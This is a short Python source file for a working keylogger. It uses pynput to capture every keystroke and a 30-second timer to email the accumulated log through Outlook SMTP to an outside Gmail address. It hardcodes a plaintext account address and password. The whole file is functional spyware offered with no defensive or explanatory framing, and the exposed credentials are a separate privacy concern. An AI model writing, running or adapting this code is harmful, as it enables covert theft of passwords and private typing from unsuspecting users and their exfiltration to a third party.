import pynput.keyboard
import smtplib
import threading
#yodisskinnyyo@outlook.com
log = ""
def callback_func(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)
def send_email(email,password,message):
    email_server = smtplib.SMTP(host="smtp-mail.outlook.com",port="587")
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,"necessitous1@gmail.com",message)
    email_server.quit()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_func)

#threading
def thread_func():
    global log
    send_email("yodisskinnyyo@outlook.com","Yodisskinnypeteyo",log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_func)
    timer_object.start()

with keylogger_listener:
    thread_func()
    keylogger_listener.join()

    send_email("yodisskinnyyo@outlook.com", "Yodisskinnypeteyo", log)
    log = ""
